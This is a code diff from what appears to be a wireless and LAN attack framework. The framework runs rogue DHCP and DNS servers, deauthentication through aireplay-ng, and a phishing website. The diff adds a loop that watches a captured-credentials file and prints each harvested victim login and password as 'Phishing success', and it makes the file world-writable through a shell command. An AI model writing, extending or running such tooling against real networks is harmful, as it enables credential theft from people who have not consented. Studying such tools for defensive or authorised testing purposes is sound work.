@@ -10,12 +10,12 @@ path.append(utils_path)
 from base import Base
 from scanner import Scanner
 from tm import ThreadManager
-from os import path, errno, makedirs
+from os import path, errno, makedirs, stat
 from shutil import copyfile, copytree
 import subprocess as sub
 from argparse import ArgumentParser
 from sys import exit, stdout
-from time import sleep, time
+from time import sleep
 from ipaddress import IPv4Address
 from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
 import re
@@ -333,7 +333,8 @@ if __name__ == "__main__":
             Base.print_error("Directory: ", se_path, " does not exist!")
             exit(1)
 
-    sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)
+    credentials_file_name = se_path + '/logins.txt'
+    sub.Popen(['chmod 777 ' + credentials_file_name + ' >/dev/null 2>&1'], shell=True)
     # endregion
 
     # region Apache2 sites settings
@@ -540,30 +541,48 @@ if __name__ == "__main__":
 
         # endregion
 
-        # region Check DNS server is run
-        script_name = "dns.py"
-        dns_server_pid = 0
-        timeout = 600
-        start = time()
+        # region Check credentials
 
-        while Base.get_process_pid(script_name) != -1:
+        # Get credentials file size
+        credentials_file_size = stat(credentials_file_name).st_size
 
-            # If timeout - kill rogue server process
-            if int(time() - start) > timeout:
-                Base.kill_process_by_name('apple_rogue_dhcp')
-                Base.kill_process_by_name('dhcp_rogue_server')
-                Base.kill_process_by_name('dns.py')
-                Base.kill_process_by_name('aireplay-ng')
-                sleep(3)
-                break
+        try:
+            while True:
+                # Credentials file has changed
+                if stat(credentials_file_name).st_size > credentials_file_size:
 
-            # Wait
-            sleep(10)
+                    # Read credentials file
+                    credentials_file_descriptor = open(credentials_file_name, 'r')
+                    credentials_file_descriptor.seek(credentials_file_size)
+                    try:
+                        for credentials in credentials_file_descriptor.readlines():
+                            credentials_list = credentials.split(' ')
+                            Base.print_success("Phishing success: ", credentials_list[0],
+                                               " credentials: ", credentials_list[1], " ", credentials_list[2][:-1])
+                    except IndexError:
+                        pass
+                    credentials_file_descriptor.close()
 
-        # endregion
+                    # Rewrite credentials file size
+                    credentials_file_size = stat(credentials_file_name).st_size
 
-        # region Exit from Main function
-        exit(0)
+                # Wait
+                sleep(1)
+
+        except KeyboardInterrupt:
+
+            # Print info message
+            Base.print_info("Exit ...")
+
+            # Kill subprocess
+            Base.kill_process_by_name('apple_rogue_dhcp')
+            Base.kill_process_by_name('dhcp_rogue_server')
+            Base.kill_process_by_name('dns.py')
+            Base.kill_process_by_name('aireplay-ng')
+
+            # Exit from Main function
+            exit(0)
+
         # endregion
 
     # endregion
